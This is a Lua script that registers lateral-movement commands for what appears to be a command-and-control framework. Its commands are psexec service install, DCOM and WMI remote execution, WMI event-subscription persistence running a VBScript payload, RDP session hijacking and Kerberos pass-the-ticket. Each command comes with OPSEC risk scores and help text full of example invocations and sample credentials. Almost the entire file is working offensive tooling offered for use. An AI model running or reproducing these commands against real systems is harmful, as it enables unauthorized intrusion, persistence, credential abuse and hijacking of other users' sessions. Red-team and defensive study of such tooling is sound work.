local function bof_path(bof_name, arch)
    return "bof/move/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end
-- psexec
local function run_psexec(args, cmd)
    local host = ""
    local svc_name = ""
    local svc_path = ""

    -- Check if using positional arguments first
    if args and #args == 3 then
        -- Positional argument format: ps_exec host service_name local_path
        host = args[1]
        svc_name = args[2]
        svc_path = args[3]
    else
        -- Flag format: ps_exec --host host --service service --path path
        host = cmd:Flags():GetString("host")
        svc_name = cmd:Flags():GetString("service")
        svc_path = cmd:Flags():GetString("path")
    end

    -- Validate required parameters
    if host == "" then
        error("host is required")
    end
    if svc_name == "" then
        error("service name is required")
    end
    if svc_path == "" then
        error("local path to service executable is required")
    end

    -- Read the service binary file
    local svc_binary = read(svc_path)
    if svc_binary == nil or #svc_binary == 0 then
        error("Service executable not found or is empty: " .. svc_path)
    end

    -- Construct remote path
    local remote_path = "\\\\" .. host .. "\\C$\\Windows\\" .. svc_name .. ".exe"

    -- Pack arguments: host, service_name, binary_data, remote_path
    local packed_args = bof_pack("zzbz", host, svc_name, svc_binary, remote_path)

    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("psexec", arch)

    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_ps_exec = command("move:psexec", run_psexec, "Execute service on target host using psexec <host> <service_name> <local_path>", "T1021.002")
cmd_ps_exec:Flags():String("host", "", "target host")
cmd_ps_exec:Flags():String("service", "", "service name")
cmd_ps_exec:Flags():String("path", "", "local path to service executable")
opsec("move:psexec", 9.0)

help("move:psexec", [[
Positional arguments format:
  move psexec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
  move psexec 192.168.1.100 TestService C:\tools\service.exe

Flag format:
  move psexec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
  move psexec --host 192.168.1.100 --service TestService --path C:\tools\service.exe

Note:
- Requires administrator privileges on target host
- Service executable will be copied to C:\Windows\ on target
- Service will be created and started automatically
]])


local function bof_path(bof_name, arch)
    return "bof/move/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end

-- dcom
local function run_dcom(args, cmd)
    local target = ""
    local username = ""
    local password = ""
    local domain = ""
    local command = ""
    local parameters = ""
    local is_current = 0

    -- Check if using positional arguments first
    if args and #args >= 2 then
        -- Positional argument format: dcom target command [parameters]
        target = args[1]
        command = args[2]
        if #args >= 3 then
            parameters = args[3]
        end
    else
        -- Flag format
        target = cmd:Flags():GetString("target")
        command = cmd:Flags():GetString("cmd")
        parameters = cmd:Flags():GetString("parameters")
        username = cmd:Flags():GetString("username")
        password = cmd:Flags():GetString("password")
        domain = cmd:Flags():GetString("domain")
    end

    -- Validate required parameters
    if target == "" then
        error("target host is required")
    end
    if command == "" then
        command = "c:\\windows\\system32\\cmd.exe"
    end

    -- Determine if using current credentials or explicit credentials
    if username == "" then
        is_current = 0
    else
        is_current = 1
    end

    -- Pack arguments: target, domain, username, password, command, parameters, is_current
    local packed_args = bof_pack("zzzzzzi", target, domain, username, password, command, parameters, is_current)

    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dcom", arch)

    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dcom = command("move:dcom", run_dcom, "Execute command on remote host via DCOM <target> <command> [parameters]", "T1021.003")
cmd_dcom:Flags():String("target", "", "target host")
cmd_dcom:Flags():String("cmd", "c:\\windows\\system32\\cmd.exe", "command to execute")
cmd_dcom:Flags():String("parameters", "", "command parameters")
cmd_dcom:Flags():String("username", "", "username (empty for current user)")
cmd_dcom:Flags():String("password", "", "password")
cmd_dcom:Flags():String("domain", "", "domain")
opsec("move:dcom", 7.5)

help("move:dcom", [[
Positional arguments format:
  move dcom 192.168.1.100 "c:\windows\system32\calc.exe"
  move dcom DOMAIN-DC "c:\windows\system32\cmd.exe" "/c whoami"

Flag format (current user):
  move dcom --target 192.168.1.100 --cmd "c:\windows\system32\calc.exe"

Flag format (explicit credentials):
  move dcom --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --cmd "c:\windows\system32\cmd.exe" --parameters "/c whoami"

Note:
- Uses DCOM (Distributed Component Object Model) for lateral movement
- If username is empty, uses current user credentials
- Default command is cmd.exe if not specified
- Requires appropriate permissions on target host
]])


-- wmi_proccreate
local function run_wmi_proccreate(args, cmd)
    local target = ""
    local username = ""
    local password = ""
    local domain = ""
    local command = ""
    local is_current = 1

    -- Check if using positional arguments first
    if args and #args >= 2 then
        -- Positional argument format: wmi-proccreate target command [username password domain]
        target = args[1]
        command = args[2]
        if #args >= 5 then
            username = args[3]
            password = args[4]
            domain = args[5]
            is_current = 0
        end
    else
        -- Flag format
        target = cmd:Flags():GetString("target")
        command = cmd:Flags():GetString("command")
        username = cmd:Flags():GetString("username")
        password = cmd:Flags():GetString("password")
        domain = cmd:Flags():GetString("domain")
    end

    -- Validate required parameters
    if target == "" then
        error("target host is required")
    end
    if command == "" then
        error("command is required")
    end

    -- Construct WMI namespace path
    local wmi_path = "\\\\" .. target .. "\\ROOT\\CIMV2"

    -- Determine if using current credentials or explicit credentials
    if username == "" then
        is_current = 1
    else
        is_current = 0
    end

    -- Pack arguments: target, domain, username, password, command, is_current
    local packed_args = bof_pack("zzzzzi", wmi_path, domain, username, password, command, is_current)

    local session = active()
    local arch = session.Os.Arch

    if arch == "x86" then
        error("x86 is not supported for WMI operations")
    end

    local bof_file = "bof/move/wmi/ProcCreate." .. arch .. ".o"

    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_wmi_proccreate = command("move:wmi-proccreate", run_wmi_proccreate, "Create process via WMI on remote host <target> <command> [username password domain]", "T1047")
cmd_wmi_proccreate:Flags():String("target", "", "target host")
cmd_wmi_proccreate:Flags():String("command", "", "command to execute")
cmd_wmi_proccreate:Flags():String("username", "", "username (empty for current user)")
cmd_wmi_proccreate:Flags():String("password", "", "password")
cmd_wmi_proccreate:Flags():String("domain", "", "domain")
opsec("move:wmi-proccreate", 7.0)

help("move:wmi-proccreate", [[
Positional arguments format (current user):
  move wmi-proccreate 192.168.1.100 "calc.exe"
  move wmi-proccreate DOMAIN-DC "powershell.exe -c whoami"

Positional arguments format (explicit credentials):
  move wmi-proccreate 192.168.1.100 "calc.exe" admin P@ssw0rd CONTOSO
  move wmi-proccreate DOMAIN-DC "cmd.exe /c dir" administrator Password123 DOMAIN

Flag format (current user):
  move wmi-proccreate --target 192.168.1.100 --command "calc.exe"

Flag format (explicit credentials):
  move wmi-proccreate --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --command "powershell.exe -c whoami"

Note:
- Uses WMI Win32_Process Create method for lateral movement
- If username is empty, uses current user credentials
- WMI path will be automatically constructed as \\target\ROOT\CIMV2
- x86 architecture is not supported
- Requires appropriate WMI permissions on target host
]])


-- wmi_eventsub
local function run_wmi_eventsub(args, cmd)
    local target = ""
    local username = ""
    local password = ""
    local domain = ""
    local vbscript_path = ""
    local vbscript = ""
    local is_current = 1

    -- Check if using positional arguments first
    if args and #args >= 2 then
        -- Positional argument format: wmi-eventsub target vbscript_path [username password domain]
        target = args[1]
        vbscript_path = args[2]
        if #args >= 5 then
            username = args[3]
            password = args[4]
            domain = args[5]
            is_current = 0
        end
    else
        -- Flag format
        target = cmd:Flags():GetString("target")
        vbscript_path = cmd:Flags():GetString("script")
        username = cmd:Flags():GetString("username")
        password = cmd:Flags():GetString("password")
        domain = cmd:Flags():GetString("domain")
    end

    -- Validate required parameters
    if target == "" then
        error("target host is required")
    end
    if vbscript_path == "" then
        error("vbscript path is required")
    end

    -- Read VBScript file
    vbscript = read(vbscript_path)
    if vbscript == nil or #vbscript == 0 then
        error("VBScript file not found or is empty: " .. vbscript_path)
    end

    -- Construct WMI namespace path
    local wmi_path = "\\\\" .. target .. "\\ROOT\\SUBSCRIPTION"

    -- Determine if using current credentials or explicit credentials
    if username == "" then
        is_current = 1
    else
        is_current = 0
    end

    -- Pack arguments: target, domain, username, password, vbscript, is_current
    local packed_args = bof_pack("zzzzzi", wmi_path, domain, username, password, vbscript, is_current)

    local session = active()
    local arch = session.Os.Arch

    if arch == "x86" then
        error("x86 is not supported for WMI operations")
    end

    local bof_file = "bof/move/wmi/EventSub." .. arch .. ".o"

    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_wmi_eventsub = command("move:wmi-eventsub", run_wmi_eventsub, "Execute VBScript via WMI Event Subscription <target> <script_path> [username password domain]", "T1047")
cmd_wmi_eventsub:Flags():String("target", "", "target host")
cmd_wmi_eventsub:Flags():String("script", "", "local path to VBScript file")
cmd_wmi_eventsub:Flags():String("username", "", "username (empty for current user)")
cmd_wmi_eventsub:Flags():String("password", "", "password")
cmd_wmi_eventsub:Flags():String("domain", "", "domain")
opsec("move:wmi-eventsub", 8.0)

help("move:wmi-eventsub", [[
Positional arguments format (current user):
  move wmi-eventsub 192.168.1.100 /tmp/payload.vbs
  move wmi-eventsub DOMAIN-DC C:\tools\script.vbs

Positional arguments format (explicit credentials):
  move wmi-eventsub 192.168.1.100 /tmp/payload.vbs admin P@ssw0rd CONTOSO
  move wmi-eventsub DOMAIN-DC C:\tools\script.vbs administrator Password123 DOMAIN

Flag format (current user):
  move wmi-eventsub --target 192.168.1.100 --script /tmp/payload.vbs

Flag format (explicit credentials):
  move wmi-eventsub --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --script /tmp/payload.vbs

Note:
- Uses WMI Event Subscription for persistent VBScript execution
- VBScript will be executed via WMI event consumer
- If username is empty, uses current user credentials
- WMI path will be automatically constructed as \\target\ROOT\SUBSCRIPTION
- x86 architecture is not supported
- Higher OPSEC risk (8.0) due to persistence mechanism
- Requires appropriate WMI permissions on target host
]])


-- rdphijack
local function run_rdphijack(args, cmd)
    local session_id = 0
    local target_session_id = 0
    local mode = ""
    local argument = ""

    -- Check if using positional arguments first
    if args and #args >= 2 then
        -- Positional argument format: rdphijack session_id target_session_id [mode argument]
        session_id = tonumber(args[1])
        target_session_id = tonumber(args[2])
        if #args >= 4 then
            mode = args[3]
            argument = args[4]
        end
    else
        -- Flag format
        session_id = cmd:Flags():GetInt("session")
        target_session_id = cmd:Flags():GetInt("target")
        mode = cmd:Flags():GetString("mode")
        argument = cmd:Flags():GetString("argument")
    end

    -- Validate required parameters
    if session_id == 0 or session_id == nil then
        error("console session id is required")
    end
    if target_session_id == 0 or target_session_id == nil then
        error("target session id is required")
    end

    -- Validate mode if specified
    if mode ~= "" and mode ~= "password" and mode ~= "server" then
        error("mode must be 'password' or 'server'")
    end

    -- If mode is specified, argument is required
    if mode ~= "" and argument == "" then
        error("argument is required when mode is specified")
    end

    -- Pack arguments based on mode
    local packed_args
    if mode == "" then
        -- No mode specified: session_id, target_session_id
        packed_args = bof_pack("ii", session_id, target_session_id)
    elseif mode == "password" then
        -- Password mode: session_id, target_session_id, password
        packed_args = bof_pack("iiz", session_id, target_session_id, argument)
    elseif mode == "server" then
        -- Server mode: session_id, target_session_id, server
        packed_args = bof_pack("iiz", session_id, target_session_id, argument)
    end

    local active_session = active()
    local arch = active_session.Os.Arch
    local bof_file = bof_path("rdphijack", arch)

    return bof(active_session, script_resource(bof_file), packed_args, true)
end

local cmd_rdphijack = command("move:rdphijack", run_rdphijack, "Hijack RDP session <session_id> <target_session_id> [mode argument]", "T1563.002")
cmd_rdphijack:Flags():Int("session", 0, "your console session id")
cmd_rdphijack:Flags():Int("target", 0, "target session id to hijack")
cmd_rdphijack:Flags():String("mode", "", "mode: 'password' or 'server'")
cmd_rdphijack:Flags():String("argument", "", "password or server name")
opsec("move:rdphijack", 9.5)

help("move:rdphijack", [[
Positional arguments format:

Redirect session 2 to session 1 (requires SYSTEM privilege):
  move rdphijack 1 2

Redirect session 2 to session 1 with password (requires high integrity):
  move rdphijack 1 2 password P@ssw0rd123

Redirect session 2 to session 1 on remote server (requires user token/ticket):
  move rdphijack 1 2 server SQL01.lab.internal

Flag format:
  move rdphijack --session 1 --target 2
  move rdphijack --session 1 --target 2 --mode password --argument P@ssw0rd123
  move rdphijack --session 1 --target 2 --mode server --argument SQL01.lab.internal

Modes:
  (none)    - Direct hijack, requires SYSTEM privilege
  password  - Use password of target session owner, requires high integrity beacon
  server    - Remote server hijack, requires token/ticket of session owner

Note:
- Uses RDP Session Hijacking technique for lateral movement
- Very high OPSEC risk (9.5) - actively hijacks user sessions
- Different modes require different privilege levels:
  * No mode: SYSTEM privilege required
  * password mode: High integrity beacon required
  * server mode: Valid token/ticket of target session owner required
- Session IDs can be enumerated with 'query user' or similar commands
]])

-- krb_ptt (Kerberos Pass-the-Ticket)
local function run_krb_ptt(args, cmd)
    local ticket_base64 = ""
    local luid = ""

    -- Check if using positional arguments first
    if args and #args >= 1 then
        -- Positional argument format: krb_ptt ticket_base64 [luid]
        ticket_base64 = args[1]
        if #args >= 2 then
            luid = args[2]
        end
    else
        -- Flag format - check different ticket sources in priority order
        local ticket_direct = cmd:Flags():GetString("ticket")
        local ticket_file = cmd:Flags():GetString("ticket-file")
        local ticket_base64_file = cmd:Flags():GetString("ticket-base64-file")
        luid = cmd:Flags():GetString("luid")

        -- Priority: ticket > ticket-base64-file > ticket-file
        if ticket_direct ~= "" then
            -- Direct base64 ticket provided
            ticket_base64 = ticket_direct
        elseif ticket_base64_file ~= "" then
            -- Read base64 ticket from file (file contains base64 string)
            local handle = io.open(ticket_base64_file, "r")
            if handle == nil then
                error("Failed to open ticket file: " .. ticket_base64_file)
            end
            ticket_base64 = handle:read("*all")
            handle:close()
            -- Trim whitespace/newlines
            ticket_base64 = ticket_base64:gsub("%s+", "")
        elseif ticket_file ~= "" then
            -- Read raw binary ticket from file (.kirbi) and encode to base64
            local handle = io.open(ticket_file, "rb")
            if handle == nil then
                error("Failed to open ticket file: " .. ticket_file)
            end
            local ticket_binary = handle:read("*all")
            handle:close()
            ticket_base64 = base64_encode(ticket_binary)
        end
    end

    -- Validate required parameters
    if ticket_base64 == "" then
        error("ticket is required (use --ticket, --ticket-file, or --ticket-base64-file)")
    end

    -- Construct full input string like Cobalt Strike format: /ticket:BASE64 [/luid:LOGONID]
    local input = "/ticket:" .. ticket_base64
    if luid ~= "" then
        input = input .. " /luid:" .. luid
    end

    -- Pack arguments: single string parameter
    local packed_args = bof_pack("z", input)

    local session = active()
    local arch = session.Os.Arch

    -- Use resource path for ptt BOF
    local ptt_path = "move/ptt/ptt." .. arch .. ".o"

    return bof(session, script_resource(ptt_path), packed_args, true)
end

local cmd_krb_ptt = command("move:krb_ptt", run_krb_ptt, "Submit a Kerberos TGT ticket (Pass-the-Ticket)", "T1550.003")
cmd_krb_ptt:Flags():String("ticket", "", "Base64 encoded Kerberos ticket (direct input)")
cmd_krb_ptt:Flags():String("ticket-file", "", "Path to raw binary ticket file (.kirbi)")
cmd_krb_ptt:Flags():String("ticket-base64-file", "", "Path to base64 encoded ticket file")
cmd_krb_ptt:Flags():String("luid", "", "Target LUID (Logon ID) - optional")
opsec("move:krb_ptt", 7.0)

help("move:krb_ptt", [[
Kerberos Pass-the-Ticket (PTT) - Submit a TGT or TGS ticket for authentication.

Positional arguments format:
  move krb_ptt <base64_ticket>
  move krb_ptt <base64_ticket> <luid>

Flag format (direct base64):
  move krb_ptt --ticket <base64_ticket>
  move krb_ptt --ticket <base64_ticket> --luid <luid>

Flag format (from file):
  move krb_ptt --ticket-file /path/to/ticket.kirbi
  move krb_ptt --ticket-base64-file /path/to/ticket.txt --luid 0x3e7

Examples:
  # Direct base64 input
  move krb_ptt doIFpDCCBaC...ggg==
  move krb_ptt --ticket doIFpDCCBaC...ggg== --luid 0x3e7

  # From raw binary .kirbi file (auto-encodes to base64)
  move krb_ptt --ticket-file /tmp/administrator.kirbi
  move krb_ptt --ticket-file C:\tickets\user.kirbi --luid 0x3e7

  # From base64 text file
  move krb_ptt --ticket-base64-file /tmp/ticket_base64.txt
  move krb_ptt --ticket-base64-file C:\tickets\ticket.b64 --luid 0x3e7

Parameters:
  --ticket              - Base64 encoded Kerberos ticket (direct input)
  --ticket-file         - Path to raw binary ticket file (.kirbi format)
  --ticket-base64-file  - Path to file containing base64 encoded ticket
  --luid                - Optional target Logon Session ID (LUID)
                          If not specified, uses current session

Priority: --ticket > --ticket-base64-file > --ticket-file

Note:
- Implements Kerberos Pass-the-Ticket attack
- Ticket can be TGT (Ticket Granting Ticket) or TGS (Service Ticket)
- LUID format: hexadecimal (e.g., 0x3e7) or decimal (e.g., 999)
- Requires appropriate privileges to inject into target LUID
- Ticket sources:
  * Rubeus: dump, asktgt, asktgs (outputs base64)
  * Mimikatz: sekurlsa::tickets /export (outputs .kirbi)
  * impacket: getTGT.py, getST.py (outputs .ccache, convert to .kirbi)

Credit: Kerbeus PTT by RalfHacker
]])


